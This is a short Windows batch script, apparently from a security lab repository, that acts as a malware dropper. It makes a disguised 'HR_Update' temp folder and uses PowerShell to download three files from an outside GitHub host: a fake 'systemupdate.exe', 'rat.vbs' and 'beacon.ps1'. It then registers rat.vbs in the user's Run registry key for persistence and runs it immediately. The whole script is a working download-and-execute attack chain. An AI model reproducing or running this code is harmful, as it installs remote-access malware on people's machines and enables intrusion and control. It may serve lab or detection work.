@echo off
set "payloadFolder=C:\Users\shawnspencer\AppData\Local\Temp\HR_Update"
mkdir "%payloadFolder%"

:: Attempt to download with PowerShell
powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/Oligo12/SentinelLab/main/systemupdate.exe -OutFile '%payloadFolder%\systemupdate.exe'"
powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/Oligo12/SentinelLab/main/rat.vbs -OutFile '%payloadFolder%\rat.vbs'"
powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/Oligo12/SentinelLab/main/beacon.ps1 -OutFile '%payloadFolder%\beacon.ps1'"

:: Check if files exist
if not exist "%payloadFolder%\systemupdate.exe" (
    echo Failed to download systemupdate.exe
    exit /b
)

if not exist "%payloadFolder%\rat.vbs" (
    echo Failed to download rat.vbs
    exit /b
)

if not exist "%payloadFolder%\beacon.ps1" (
    echo Failed to download beacon.ps1
    exit /b
)

:: Set to startup
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v HR_Update /t REG_SZ /d "%payloadFolder%\rat.vbs" /f

:: Run the VBS payload immediately
cscript "%payloadFolder%\rat.vbs"
